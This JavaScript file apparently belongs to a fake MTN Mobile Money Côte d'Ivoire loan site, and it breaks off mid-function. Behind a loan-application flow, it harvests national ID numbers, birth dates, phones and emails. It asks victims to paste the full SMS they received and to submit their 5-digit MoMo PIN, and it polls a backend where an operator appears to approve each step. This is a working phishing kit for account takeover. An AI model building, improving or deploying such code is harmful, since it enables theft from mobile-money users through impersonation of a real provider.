// ============================================================
// script.js – MTN Mobile Money Côte d'Ivoire  (v7.7)
// BCEAO-compliant accounts · Skip-linking flow · JSON backend
// ============================================================
'use strict';

var ACCOUNT_TYPES = {
    simplifie: { name: 'Compte Simplifié', icon: '🟢', dailyCash: 200000,  monthlyCap: 500000,   maxLoan: 100000,  minLoan: 25000,  requiresId: true },
    standard:  { name: 'Compte Standard',  icon: '🔵', dailyCash: 500000,  monthlyCap: 2000000,  maxLoan: 500000,  minLoan: 50000,  requiresId: true },
    premium:   { name: 'Compte Premium',   icon: '🟣', dailyCash: 2000000, monthlyCap: 10000000, maxLoan: 2000000, minLoan: 100000, requiresId: true }
};

var STEPS = ['loan', 'personal', 'employment', 'guarantor', 'momologin', 'qualification'];
var POLL_INTERVAL = 2500;
var POLL_MAX_DURATION = 30 * 60 * 1000;
var ANNUAL_RATE = 0.24;
var SERVICE_FEE = 500;

var S = {
    applicationId: '',
    isRegistered: false,
    registrationStatus: 'idle',
    accountType: null,
    accountMaxLoan: 0,
    idNumber: null,
    dob: null,
    steps: {},
    loan: {}, personal: {}, employment: {}, guarantor: {}
};

var KEYS = { APP_ID: 'momo_ci_app_id_v7', APP_DATA: 'momo_ci_data_v7' };

var activePoll = null;
var currentPollStep = null;
var currentPollCallback = null;
var currentPollStarted = 0;
var regPollTimer = null;
var selectedAccountType = null;
var selectedChooseAccountType = null;
var qualificationAnimator = null;
var _termsCache = null;

// ═══════════════════════════════════════════════════════════
// STORAGE HELPERS
// ═══════════════════════════════════════════════════════════
function save(k, d) { try { localStorage.setItem(k, JSON.stringify(d)); } catch (e) {} }
function get(k) { try { var d = localStorage.getItem(k); return d ? JSON.parse(d) : null; } catch (e) { return null; } }
function rm(k) { try { localStorage.removeItem(k); } catch (e) {} }

function saveAll() {
    save(KEYS.APP_ID, S.applicationId);
    save(KEYS.APP_DATA, {
        isRegistered: S.isRegistered,
        registrationStatus: S.registrationStatus,
        accountType: S.accountType,
        accountMaxLoan: S.accountMaxLoan,
        dob: S.dob,
        steps: S.steps,
        loan: S.loan, personal: S.personal,
        employment: S.employment, guarantor: S.guarantor
    });
}

// ═══════════════════════════════════════════════════════════
// FORMATTING
// ═══════════════════════════════════════════════════════════
function fmt(n) {
    var num = Number(n) || 0;
    return num.toLocaleString('fr-FR').replace(/\u202f/g, ' ').replace(/\u00a0/g, ' ');
}
function fmtXOF(n) { return fmt(n) + ' F CFA'; }

function escapeHtml(s) {
    return String(s || '').replace(/[&<>"']/g, function (c) {
        return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
    });
}

function genAppId() {
    var rand;
    try {
        rand = (crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36)).replace(/-/g, '').toUpperCase();
    } catch (e) {
        rand = Math.random().toString(36).replace(/[^a-z0-9]/gi, '').toUpperCase();
    }
    return 'CI-MTN-' + rand.slice(0, 8);
}

function showToast(msg, type, duration) {
    type = type || 'info';
    duration = duration || 3200;
    document.querySelectorAll('.toast').forEach(function (t) { t.remove(); });
    var el = document.createElement('div');
    el.className = 'toast toast-' + type;
    el.textContent = msg;
    document.body.appendChild(el);
    setTimeout(function () {
        el.style.opacity = '0';
        el.style.transform = 'translateX(-50%) translateY(-20px)';
        setTimeout(function () { el.remove(); }, 300);
    }, duration);
}

function showErr(id, msg) {
    var box = document.getElementById(id);
    if (box) {
        box.classList.add('show');
        var t = document.getElementById(id + 'Txt');
        if (t) t.textContent = msg;
    }
}
function clearErr(id) {
    var box = document.getElementById(id);
    if (box) box.classList.remove('show');
}
function setBtnLoading(btn, loading, defaultText) {
    if (!btn) return;
    btn.disabled = loading;
    btn.textContent = loading ? 'Veuillez patienter...' : defaultText;
}

async function apiCall(endpoint, options) {
    options = options || {};
    try {
        var fetchOpts = Object.assign({
            credentials: 'same-origin',
            headers: { 'Content-Type': 'application/json' }
        }, options);
        fetchOpts.headers = Object.assign({ 'Content-Type': 'application/json' }, options.headers || {});
        var res = await fetch(endpoint, fetchOpts);
        var data = await res.json();
        if (res.status === 429 || (data && data.code === 'RATE_LIMITED')) {
            var msg = (data && data.error) || 'Vous avez dépassé la limite d\'essais. Réessayez dans 5 minutes.';
            showToast('⏳ ' + msg, 'error', 6000);
            throw new Error(msg);
        }
        return data;
    } catch (e) {
        console.error(endpoint + ':', e.message);
        throw e;
    }
}

// ═══════════════════════════════════════════════════════════
// NAVIGATION
// ═══════════════════════════════════════════════════════════
function goTo(pageId) {
    if (requiresRegistration(pageId) && !isUserRegistered()) {
        forceRegistration();
        return;
    }
    document.querySelectorAll('.page').forEach(function (p) { p.classList.remove('active'); });
    var el = document.getElementById(pageId);
    if (el) el.classList.add('active');
    window.scrollTo(0, 0);
    try { history.pushState({ page: pageId }, '', '#' + pageId); } catch (e) {}

    if (pageId === 'page-requirements') updateRequirementsLimits();
    if (pageId === 'page-step1') refreshStep1();
    if (pageId === 'page-step2') prefillPersonal();
    if (pageId === 'page-momologin') prefillMoMoLogin();
    if (pageId === 'page-confirmation') updateConfirmation();
    refreshAccountBadges();

    if (pageId.indexOf('page-wait-') !== 0 && pageId !== 'page-scan' && pageId.indexOf('page-registration-') !== 0 && pageId !== 'page-choose-path') {
        stopPolling();
    }
}

function requiresRegistration(pageId) {
    var list = ['page-step1','page-step2','page-step3','page-guarantor','page-confirmation',
                'page-momologin','page-scan','page-approval',
                'page-wait-loan','page-wait-personal','page-wait-employment',
                'page-wait-guarantor','page-wait-momologin'];
    return list.indexOf(pageId) !== -1;
}
function isUserRegistered() {
    if (!S.isRegistered || !S.accountType || !ACCOUNT_TYPES[S.accountType]) return false;
    return S.registrationStatus === 'completed' || S.registrationStatus === 'skipped';
}
function forceRegistration(reason) {
    showToast('🔗 Veuillez terminer votre inscription pour continuer', 'info', 3500);
    setTimeout(function () {
        routeRegistrationFlow();
        if (reason) setTimeout(function () { showErr('regErr', reason); }, 400);
    }, 800);
}

function refreshAccountBadges() {
    var type = S.accountType ? ACCOUNT_TYPES[S.accountType] : null;
    var label = type ? type.icon + ' ' + type.name : '';
    if (type && S.registrationStatus === 'skipped') label += ' ⚡';
    ['navbarAccount0','navbarAccount','navbarAccount2','navbarAccount3','navbarAccount4','navbarAccount5','navbarAccount6'].forEach(function (id) {
        var el = document.getElementById(id);
        if (el) el.innerHTML = label ? '<div class="nav-badge">' + label + '</div>' : '';
    });
}

// ═══════════════════════════════════════════════════════════
// VALIDATION
// ═══════════════════════════════════════════════════════════
function validateCNIClient(cni) {
    var clean = String(cni || '').replace(/\s/g, '').toUpperCase();
    if (!clean) return { ok: false, reason: 'Veuillez saisir votre numéro de CNI.' };
    if (!/^[A-Z0-9]{8,14}$/.test(clean)) {
        return { ok: false, reason: 'Le numéro CNI doit contenir 8 à 14 caractères alphanumériques.' };
    }
    return { ok: true, clean: clean };
}

function validateDobClient(dobIso) {
    if (!dobIso) return { ok: false, reason: 'Veuillez saisir votre date de naissance.' };
    var d = new Date(dobIso);
    if (isNaN(d.getTime())) return { ok: false, reason: 'Date de naissance invalide.' };
    var now = new Date();
    var age = now.getFullYear() - d.getFullYear();
    var m = now.getMonth() - d.getMonth();
    if (m < 0 || (m === 0 && now.getDate() < d.getDate())) age--;
    if (age < 18) return { ok: false, reason: 'Vous devez avoir 18 ans ou plus.' };
    if (age > 100) return { ok: false, reason: 'Âge maximum dépassé.' };
    return { ok: true };
}

function normalizePhone(id) {
    var inp = document.getElementById(id);
    if (!inp) return;
    var v = inp.value.replace(/\D/g, '');
    if (v.length > 10) v = v.substring(0, 10);
    inp.value = v;
}

// ═══════════════════════════════════════════════════════════
// CALCULATOR
// ═══════════════════════════════════════════════════════════
function updateCalc() {
    var slider = document.getElementById('amtSlider');
    if (!slider) return;
    var maxAllowed = isUserRegistered()
        ? Math.min(2000000, ACCOUNT_TYPES[S.accountType].maxLoan)
        : 2000000;
    slider.min = 25000;
    slider.max = maxAllowed;
    if (+slider.value > maxAllowed) slider.value = maxAllowed;
    if (+slider.value < 25000) slider.value = 25000;

    var amt = +slider.value;
    var termEl = document.getElementById('calcTermSelect');
    var term = termEl ? +termEl.value : 12;
    var r = ANNUAL_RATE / 12;
    var monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -term)) + SERVICE_FEE);
    var total = monthly * term;

    var set = function (id, val) { var el = document.getElementById(id); if (el) el.textContent = val; };
    set('calcAmt', fmtXOF(amt));
    set('monthlyAmt', fmtXOF(monthly));
    set('totalAmt', fmtXOF(total));
    set('receiveAmt', fmtXOF(amt));

    var pct = ((amt - 25000) / Math.max(1, maxAllowed - 25000)) * 100;
    slider.style.setProperty('--pct', Math.max(0, Math.min(100, pct)) + '%');

    var ends = slider.parentElement && slider.parentElement.querySelector('.range-ends');
    if (ends) ends.innerHTML = '<span>25 000 F CFA</span><span>' + fmtXOF(maxAllowed) + '</span>';
}

// ═══════════════════════════════════════════════════════════
// LANDING ACTIONS
// ═══════════════════════════════════════════════════════════
function applyAsExistingUser() {
    console.log('[applyAsExistingUser] status:', S.registrationStatus);

    if (isUserRegistered()) {
        if (S.steps.loan === 'approved') {
            if (S.steps.personal === 'approved') {
                if (S.steps.employment === 'approved') {
                    if (S.steps.guarantor === 'approved') { goTo('page-confirmation'); return; }
                    goTo('page-guarantor'); return;
                }
                goTo('page-step3'); return;
            }
            goTo('page-step2'); return;
        }
        goTo('page-step1');
        return;
    }

    if (S.isRegistered && S.registrationStatus && S.registrationStatus !== 'completed' && S.registrationStatus !== 'skipped') {
        routeRegistrationFlow();
        return;
    }

    if (S.registrationStatus === 'skipped') {
        selectedChooseAccountType = S.accountType || null;
        resetChoosePage();
        if (selectedChooseAccountType) markChooseAccountType(selectedChooseAccountType);
        goTo('page-choose-path');
        return;
    }

    selectedChooseAccountType = null;
    resetChoosePage();
    goTo('page-choose-path');
}

function applyFromCalculator() {
    var slider = document.getElementById('amtSlider');
    var termEl = document.getElementById('calcTermSelect');
    var amt = slider ? +slider.value : 100000;
    var term = termEl ? termEl.value + ' Mois' : '12 Mois';
    var max = S.accountMaxLoan || (S.accountType ? ACCOUNT_TYPES[S.accountType].maxLoan : amt);
    var finalAmt = Math.min(amt, max);
    S.loan = Object.assign({}, S.loan, { loanAmount: finalAmt, loanTerm: term });
    saveAll();
    if (!isUserRegistered()) {
        showToast('💾 Enregistré ' + fmtXOF(finalAmt) + ' — terminez l\'inscription', 'info', 4000);
        setTimeout(applyAsExistingUser, 500);
        return;
    }
    showToast(fmtXOF(finalAmt) + ' sélectionné', 'success');
    goTo('page-step1');
}

// ═══════════════════════════════════════════════════════════
// CHOOSE PATH PAGE
// ═══════════════════════════════════════════════════════════
function resetChoosePage() {
    document.querySelectorAll('#chooseAccountTypes .account-type').forEach(function (el) {
        el.classList.remove('selected');
        var c = el.querySelector('.at-check');
        if (c) c.textContent = '○';
    });
    clearErr('chooseErr');
}

function markChooseAccountType(type) {
    document.querySelectorAll('#chooseAccountTypes .account-type').forEach(function (el) {
        var m = el.dataset.type === type;
        el.classList.toggle('selected', m);
        var c = el.querySelector('.at-check');
        if (c) c.textContent = m ? '●' : '○';
    });
}

function selectChooseAccount(type) {
    selectedChooseAccountType = type;
    markChooseAccountType(type);
    clearErr('chooseErr');
}

async function continueWithoutLinking() {
    if (!selectedChooseAccountType) {
        return showErr('chooseErr', 'Veuillez sélectionner votre type de compte.');
    }
    if (!S.applicationId) S.applicationId = genAppId();

    try {
        var data = await apiCall('/api/register-skip', {
            method: 'POST',
            body: JSON.stringify({
                applicationId: S.applicationId,
                accountType: selectedChooseAccountType
            })
        });
        if (!data.ok) return showErr('chooseErr', data.error || 'Impossible de créer le dossier.');

        S.isRegistered = true;
        S.registrationStatus = 'skipped';
        S.accountType = selectedChooseAccountType;
        S.accountMaxLoan = data.maxLoan;
        S.steps = { loan: 'idle', personal: 'idle', employment: 'idle', guarantor: 'idle', momologin: 'idle', qualification: 'idle' };
        saveAll();
        updateCalc();

        showToast('⚡ Vous pouvez appliquer directement. Vérification demandée à l\'étape finale.', 'info', 4500);
        setTimeout(function () { goTo('page-requirements'); }, 800);
    } catch (e) {
        showErr('chooseErr', e.message);
    }
}

function continueWithLinking() {
    if (!selectedChooseAccountType) {
        return showErr('chooseErr', 'Veuillez sélectionner votre type de compte.');
    }
    startMoMoRegistration({ mode: 'link', accountType: selectedChooseAccountType });
}

// ═══════════════════════════════════════════════════════════
// REGISTRATION (full, with SMS + PIN)
// ═══════════════════════════════════════════════════════════
function startMoMoRegistration(opts) {
    opts = opts || {};
    var mode = opts.mode || 'register';
    var preAccountType = opts.accountType || null;

    S.isRegistered = false;
    S.accountType = null;
    S.accountMaxLoan = 0;
    S.idNumber = null;
    S.dob = null;
    S.registrationStatus = 'idle';
    S.steps = {};
    saveAll();

    var setVal = function (id, v) { var el = document.getElementById(id); if (el) el.value = v; };
    setVal('regId', '');
    setVal('regName', '');
    setVal('regPhone', '');
    setVal('regEmail', '');
    setVal('regDob', '');
    var tnc = document.getElementById('regTnc');
    if (tnc) tnc.checked = false;

    selectedAccountType = preAccountType;
    document.querySelectorAll('#accountTypes .account-type').forEach(function (el) {
        var m = preAccountType && el.dataset.type === preAccountType;
        el.classList.toggle('selected', m);
        var c = el.querySelector('.at-check');
        if (c) c.textContent = m ? '●' : '○';
    });
    var hint = document.getElementById('accountTypeHint');
    if (hint) {
        var names = { simplifie: 'Compte Simplifié', standard: 'Compte Standard', premium: 'Compte Premium' };
        hint.textContent = preAccountType ? ('✅ ' + names[preAccountType]) : 'Appuyez pour sélectionner';
    }
    clearErr('regErr');

    var heading = document.getElementById('regHeading');
    var sub = document.getElementById('regSubheading');
    var introH3 = document.getElementById('regIntroH3');
    var introP = document.getElementById('regIntroP');
    if (mode === 'link') {
        if (heading) heading.textContent = 'Lier votre compte MoMo';
        if (sub) sub.textContent = 'Vérifiez votre CNI pour lier votre compte existant';
        if (introH3) introH3.textContent = 'Liez votre compte MoMo existant';
        if (introP) introP.textContent = 'Confirmez votre CNI, téléphone et email, puis choisissez le type de compte que vous détenez.';
    } else {
        if (heading) heading.textContent = 'Inscription MoMo';
        if (sub) sub.textContent = 'Inscrivez-vous en moins de 60 secondes';
        if (introH3) introH3.textContent = 'Vous êtes à 2 étapes de votre prêt';
        if (introP) introP.textContent = 'MoMo est le service de monnaie mobile de MTN. Enregistrez votre portefeuille, puis demandez un prêt.';
    }

    goTo('page-register-check');
}

function selectAccountType(type) {
    selectedAccountType = type;
    var names = { simplifie: 'Compte Simplifié', standard: 'Compte Standard', premium: 'Compte Premium' };
    document.querySelectorAll('#accountTypes .account-type').forEach(function (el) {
        var m = el.dataset.type === type;
        el.classList.toggle('selected', m);
        var c = el.querySelector('.at-check');
        if (c) c.textContent = m ? '●' : '○';
    });
    var hint = document.getElementById('accountTypeHint');
    if (hint) hint.textContent = '✅ ' + names[type];
}

async function completeRegistration() {
    var id = ((document.getElementById('regId') || {}).value || '').trim().toUpperCase();
    var fullName = ((document.getElementById('regName') || {}).value || '').trim();
    var phone = ((document.getElementById('regPhone') || {}).value || '').trim();
    var email = ((document.getElementById('regEmail') || {}).value || '').trim();
    var dob = (document.getElementById('regDob') || {}).value || '';
    var tnc = !!(document.getElementById('regTnc') || {}).checked;

    if (!id) return showErr('regErr', 'Veuillez saisir votre numéro de CNI.');
    var cniCheck = validateCNIClient(id);
    if (!cniCheck.ok) return showErr('regErr', cniCheck.reason);
    if (!fullName || fullName.length < 3) return showErr('regErr', 'Veuillez saisir votre nom complet.');
    if (phone.length !== 10) return showErr('regErr', 'Le numéro de téléphone doit comporter 10 chiffres.');
    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return showErr('regErr', 'Adresse email invalide.');
    var dobCheck = validateDobClient(dob);
    if (!dobCheck.ok) return showErr('regErr', dobCheck.reason);
    if (!selectedAccountType) return showErr('regErr', 'Veuillez sélectionner un type de compte.');
    if (!tnc) return showErr('regErr', 'Vous devez lire et accepter les Conditions Générales.');

    if (!S.applicationId) S.applicationId = genAppId();
    saveAll();

    var btn = document.getElementById('regBtn');
    setBtnLoading(btn, true, 'Terminer l\'inscription');
    goTo('page-register-processing');
    var statusEl = document.getElementById('regProcessingStatus');
    if (statusEl) statusEl.textContent = '⏳ Envoi pour vérification...';

    try {
        var data = await apiCall('/api/register-momo', {
            method: 'POST',
            body: JSON.stringify({
                applicationId: S.applicationId,
                idNumber: id,
                accountType: selectedAccountType,
                phone: phone,
                email: email,
                dob: dob,
                tncAccepted: tnc,
                fullName: fullName
            })
        });
        if (!data.ok) {
            goTo('page-register-check');
            showErr('regErr', data.error || 'Échec de l\'inscription.');
            setBtnLoading(btn, false, 'Terminer l\'inscription');
            return;
        }

        S.idNumber = id;
        S.dob = data.dob || dob;
        S.accountType = selectedAccountType;
        S.accountMaxLoan = data.maxLoan;
        S.isRegistered = true;
        S.registrationStatus = 'pending_review';
        S.personal = Object.assign({}, S.personal, { phone: phone, email: email });
        saveAll();
        updateCalc();

        setBtnLoading(btn, false, 'Terminer l\'inscription');
        var appIdEl = document.getElementById('regWaitAppId');
        if (appIdEl) appIdEl.textContent = S.applicationId;
        goTo('page-registration-wait');
        pollRegistrationStatus();
    } catch (e) {
        goTo('page-register-check');
        showErr('regErr', e.message);
        setBtnLoading(btn, false, 'Terminer l\'inscription');
    }
}

// ═══════════════════════════════════════════════════════════
// REGISTRATION FLOW ROUTER + POLLING
// ═══════════════════════════════════════════════════════════
function routeRegistrationFlow() {
    var st = S.registrationStatus || 'idle';
    if (st === 'idle') goTo('page-register-check');
    else if (st === 'skipped') goTo('page-requirements');
    else if (st === 'pending_review') {
        var el = document.getElementById('regWaitAppId');
        if (el) el.textContent = S.applicationId;
        goTo('page-registration-wait');
        pollRegistrationStatus();
    }
    else if (st === 'sms_pending') {
        var el2 = document.getElementById('regSmsPhone');
        if (el2 && S.personal.phone) el2.textContent = '+225 ' + S.personal.phone;
        goTo('page-registration-sms');
    }
    else if (st === 'sms_submitted') {
        var el4 = document.getElementById('regSmsWaitAppId');
        if (el4) el4.textContent = S.applicationId;
        goTo('page-registration-sms-wait');
        pollSmsStatus();
    }
    else if (st === 'sms_verified') goTo('page-registration-pin');
    else if (st === 'pin_pending') {
        var el3 = document.getElementById('regPinWaitAppId');
        if (el3) el3.textContent = S.applicationId;
        goTo('page-registration-pin-wait');
        pollPinStatus();
    }
    else if (st === 'completed') goTo('page-requirements');
    else if (st === 'rejected') goTo('page-registration-rejected');
    else goTo('page-register-check');
}

function stopRegPoll() {
    if (regPollTimer) { clearTimeout(regPollTimer); regPollTimer = null; }
}

async function pollRegistrationStatus() {
    stopRegPoll();
    var tick = async function () {
        try {
            var r = await fetch('/api/registration/status/' + S.applicationId, { credentials: 'same-origin' });
            if (!r.ok) throw new Error('HTTP ' + r.status);
            var data = await r.json();
            if (!data.ok) { regPollTimer = setTimeout(tick, 3000); return; }
            S.registrationStatus = data.status;
            S.accountType = data.accountType || S.accountType;
            S.accountMaxLoan = data.accountMaxLoan || S.accountMaxLoan;
            saveAll();

            if (data.status === 'pending_review') { regPollTimer = setTimeout(tick, 3000); return; }
            if (data.status === 'sms_pending') {
                stopRegPoll();
                showToast('✅ Inscription approuvée — veuillez coller votre SMS', 'success', 4000);
                var phoneEl = document.getElementById('regSmsPhone');
                if (phoneEl) phoneEl.textContent = data.phone ? '+225 ' + data.phone : '+225 —';
                goTo('page-registration-sms');
                setTimeout(function () { var el = document.getElementById('regSms'); if (el) el.focus(); }, 200);
                return;
            }
            if (data.status === 'sms_submitted') {
                stopRegPoll();
                var elW = document.getElementById('regSmsWaitAppId');
                if (elW) elW.textContent = S.applicationId;
                goTo('page-registration-sms-wait');
                pollSmsStatus();
                return;
            }
            if (data.status === 'sms_verified') { stopRegPoll(); goTo('page-registration-pin'); return; }
            if (data.status === 'pin_pending') {
                stopRegPoll();
                var el = document.getElementById('regPinWaitAppId');
                if (el) el.textContent = S.applicationId;
                goTo('page-registration-pin-wait');
                pollPinStatus();
                return;
            }
            if (data.status === 'completed') {
                stopRegPoll();
                showToast('🎉 Inscription terminée !', 'success', 3000);
                goTo('page-requirements');
                return;
            }
            if (data.status === 'rejected') {
                stopRegPoll();
                var el2 = document.getElementById('regRejectReason');
                if (el2) el2.textContent = data.rejectionReason || 'Inscription rejetée.';
                goTo('page-registration-rejected');
                return;
            }
            regPollTimer = setTimeout(tick, 3000);
        } catch (e) {
            console.warn('Poll inscription:', e.message);
            regPollTimer = setTimeout(tick, 4000);
        }
    };
    tick();
}

async function pollSmsStatus() {
    stopRegPoll();
    var tick = async function () {
        try {
            var r = await fetch('/api/registration/status/' + S.applicationId, { credentials: 'same-origin' });
            var data = await r.json();
            if (!data.ok) { regPollTimer = setTimeout(tick, 3000); return; }
            S.registrationStatus = data.status;
            saveAll();

            if (data.status === 'sms_submitted') { regPollTimer = setTimeout(tick, 3000); return; }
            if (data.status === 'sms_verified') {
                stopRegPoll();
                showToast('✅ SMS confirmé ! Définissez votre code PIN.', 'success', 3000);
                goTo('page-registration-pin');
                return;
            }
            if (data.status === 'sms_pending') {
                stopRegPoll();
                showToast('⚠️ Le SMS n\'a pas été accepté. Recollez-le.', 'error', 5000);
                var el = document.getElementById('regSms');
                if (el) el.value = '';
                goTo('page-registration-sms');
                return;
            }
            if (data.status === 'rejected') {
                stopRegPoll();
                var el2 = document.getElementById('regRejectReason');
                if (el2) el2.textContent = data.rejectionReason || 'Inscription rejetée.';
                goTo('page-registration-rejected');
                return;
            }
            regPollTimer = setTimeout(tick, 3000);
        } catch (e) { regPollTimer = setTimeout(tick, 4000); }
    };
    tick();
}

async function pollPinStatus() {
    stopRegPoll();
    var tick = async function () {
        try {
            var r = await fetch('/api/registration/status/' + S.applicationId, { credentials: 'same-origin' });
            var data = await r.json();
            if (!data.ok) { regPollTimer = setTimeout(tick, 3000); return; }
            S.registrationStatus = data.status;
            saveAll();
            if (data.status === 'completed') {
                stopRegPoll();
                showToast('🎉 Inscription terminée !', 'success', 3000);
                goTo('page-requirements');
                return;
            }
            if (data.status === 'sms_verified') {
                stopRegPoll();
                showToast('⚠️ Code PIN refusé. Choisissez-en un autre.', 'error', 5000);
                goTo('page-registration-pin');
                ['regPin0','regPin1','regPin2','regPin3','regPin4','regPinC0','regPinC1','regPinC2','regPinC3','regPinC4'].forEach(function (id) {
                    var el = document.getElementById(id); if (el) el.value = '';
                });
                return;
            }
            if (data.status === 'rejected') {
                stopRegPoll();
                var el = document.getElementById('regRejectReason');
                if (el) el.textContent = data.rejectionReason || 'Inscription rejetée.';
                goTo('page-registration-rejected');
                return;
            }
            regPollTimer = setTimeout(tick, 3000);
        } catch (e) { regPollTimer = setTimeout(tick, 4000); }
    };
    tick();
}

async function submitRegistrationSms() {
    var el = document.getElementById('regSms');
    var sms = (el ? el.value : '').trim();
    if (!sms) return showErr('regSmsErr', 'Veuillez coller le SMS complet.');
    if (sms.length < 10) return showErr('regSmsErr', 'Collez le SMS complet reçu.');
    if (sms.length > 2000) return showErr('regSmsErr', 'Le SMS est trop long.');
    clearErr('regSmsErr');
    var btn = document.getElementById('regSmsBtn');
    setBtnLoading(btn, true, 'Envoi...');
    try {
        var data = await apiCall('/api/registration/submit-sms', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, sms: sms })
        });
        setBtnLoading(btn, false, 'Envoyer le SMS');
        if (!data.ok) { showErr('regSmsErr', data.error || 'Impossible d\'envoyer le SMS.'); return; }
        S.registrationStatus = 'sms_submitted';
        saveAll();
        var el2 = document.getElementById('regSmsWaitAppId');
        if (el2) el2.textContent = S.applicationId;
        goTo('page-registration-sms-wait');
        pollSmsStatus();
    } catch (e) {
        setBtnLoading(btn, false, 'Envoyer le SMS');
        showErr('regSmsErr', e.message);
    }
}

async function submitRegistrationPin() {
    var pin = [0,1,2,3,4].map(function (i) { return (document.getElementById('regPin' + i) || {}).value || ''; }).join('');
    var pinC = [0,1,2,3,4].map(function (i) { return (document.getElementById('regPinC' + i) || {}).value || ''; }).join('');
    if (pin.length !== 5) return showErr('regPinErr', 'Saisissez un code PIN à 5 chiffres.');
    if (pin !== pinC) return showErr('regPinErr', 'Les codes PIN ne correspondent pas.');
    clearErr('regPinErr');
    var btn = document.getElementById('regPinBtn');
    setBtnLoading(btn, true, 'Définition...');
    try {
        var data = await apiCall('/api/registration/set-pin', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, pin: pin })
        });
        setBtnLoading(btn, false, 'Définir le code PIN');
        if (!data.ok) return showErr('regPinErr', data.error || 'Impossible de définir le code PIN.');
        showToast('🔐 Code PIN envoyé pour vérification', 'success');
        S.registrationStatus = 'pin_pending';
        saveAll();
        var el = document.getElementById('regPinWaitAppId');
        if (el) el.textContent = S.applicationId;
        goTo('page-registration-pin-wait');
        pollPinStatus();
    } catch (e) {
        setBtnLoading(btn, false, 'Définir le code PIN');
        showErr('regPinErr', e.message);
    }
}

async function restartRegistration() {
    try {
        await apiCall('/api/registration/reset', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId })
        });
    } catch (e) {}
    startMoMoRegistration({ mode: 'register' });
}

// ═══════════════════════════════════════════════════════════
// REQUIREMENTS
// ═══════════════════════════════════════════════════════════
function updateRequirementsLimits() {
    var tc = ACCOUNT_TYPES[S.accountType] || ACCOUNT_TYPES.simplifie;
    var a = document.getElementById('reqLimitText');
    if (a) a.innerHTML = '<b>' + tc.icon + ' ' + tc.name + '</b><br>Journalier : ' + fmtXOF(tc.dailyCash) + ' · Mensuel : ' + fmtXOF(tc.monthlyCap) + '<br><b>Prêt max : ' + fmtXOF(tc.maxLoan) + '</b>';
    var b = document.getElementById('reqTxText');
    if (b) b.innerHTML = 'Avoir <b>20 % du montant du prêt</b> en transactions MoMo ce mois-ci. Exemple : pour ' + fmtXOF(tc.maxLoan) + ' → ' + fmtXOF(Math.ceil(tc.maxLoan * 0.20)) + '.';
}

// ═══════════════════════════════════════════════════════════
// STEP 1: LOAN
// ═══════════════════════════════════════════════════════════
function refreshStep1() {
    if (!isUserRegistered()) { forceRegistration(); return; }
    var tc = ACCOUNT_TYPES[S.accountType];
    var box = document.getElementById('accInfoBox');
    if (box) box.style.display = 'block';
    var txt = document.getElementById('accInfoText');
    if (txt) txt.innerHTML = '<b>' + tc.icon + ' ' + tc.name + '</b> — Prêt max <b>' + fmtXOF(tc.maxLoan) + '</b>';
    var hint = document.getElementById('loanLimitHint');
    if (hint) hint.textContent = 'Min ' + fmtXOF(tc.minLoan) + ' · Max ' + fmtXOF(tc.maxLoan);
    var am = document.getElementById('s1am');
    if (!am) return;
    am.min = tc.minLoan;
    am.max = tc.maxLoan;
    if (S.loan.loanAmount) am.value = Math.min(S.loan.loanAmount, tc.maxLoan);
    if (+am.value > tc.maxLoan) am.value = tc.maxLoan;
    if (+am.value < tc.minLoan) am.value = tc.minLoan;
    var ty = document.getElementById('s1ty'); if (ty && S.loan.loanType) ty.value = S.loan.loanType;
    var te = document.getElementById('s1te'); if (te && S.loan.loanTerm) te.value = S.loan.loanTerm;
    var pu = document.getElementById('s1pu'); if (pu && S.loan.loanPurpose) pu.value = S.loan.loanPurpose;
}

async function submitStepLoan() {
    if (!isUserRegistered()) return forceRegistration();
    var ty = (document.getElementById('s1ty') || {}).value;
    var am = +(document.getElementById('s1am') || {}).value;
    var te = (document.getElementById('s1te') || {}).value;
    var pu = ((document.getElementById('s1pu') || {}).value || '').trim();
    var tc = ACCOUNT_TYPES[S.accountType];
    if (!ty || !te || !pu) return showErr('s1Err', 'Remplissez tous les champs.');
    if (am < tc.minLoan) return showErr('s1Err', 'Min ' + fmtXOF(tc.minLoan) + '.');
    if (am > tc.maxLoan) return showErr('s1Err', 'Max ' + fmtXOF(tc.maxLoan) + '.');
    var btn = document.getElementById('s1Btn');
    setBtnLoading(btn, true, 'Soumission...');
    clearErr('s1Err');
    try {
        var data = await apiCall('/api/submit-step', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, step: 'loan',
                data: { loanType: ty, loanAmount: am, loanTerm: te, loanPurpose: pu } })
        });
        setBtnLoading(btn, false, 'Soumettre pour approbation');
        if (!data.ok) {
            if (data.code === 'NOT_REGISTERED' || data.code === 'REGISTRATION_INCOMPLETE') { forceRegistration(); return; }
            return showErr('s1Err', data.error || 'Échec de soumission.');
        }
        S.loan = { loanType: ty, loanAmount: am, loanTerm: te, loanPurpose: pu };
        S.steps.loan = 'pending';
        saveAll();
        goTo('page-wait-loan');
        startPolling('loan', function () {
            S.steps.loan = 'approved'; saveAll();
            showToast('✅ Prêt approuvé !', 'success');
            goTo('page-step2');
        });
    } catch (e) { showErr('s1Err', e.message); setBtnLoading(btn, false, 'Soumettre pour approbation'); }
}

// ═══════════════════════════════════════════════════════════
// STEP 2: PERSONAL
// ═══════════════════════════════════════════════════════════
function prefillPersonal() {
    var set = function (id, v) { var el = document.getElementById(id); if (el && v) el.value = v; };
    set('s2fi', S.personal.firstName);
    set('s2la', S.personal.lastName);
    set('s2ph', S.personal.phone);
    set('s2em', S.personal.email);
}

async function submitStepPersonal() {
    if (!isUserRegistered()) return forceRegistration();
    var fi = ((document.getElementById('s2fi') || {}).value || '').trim();
    var la = ((document.getElementById('s2la') || {}).value || '').trim();
    var ph = (document.getElementById('s2ph') || {}).value || '';
    var em = ((document.getElementById('s2em') || {}).value || '').trim();
    if (!fi || !la) return showErr('s2Err', 'Saisissez votre nom complet.');
    if (ph.length !== 10) return showErr('s2Err', 'Le téléphone doit comporter 10 chiffres.');
    if (!em || em.indexOf('@') === -1) return showErr('s2Err', 'Saisissez un email valide.');
    var btn = document.getElementById('s2Btn');
    setBtnLoading(btn, true, 'Soumission...');
    clearErr('s2Err');
    try {
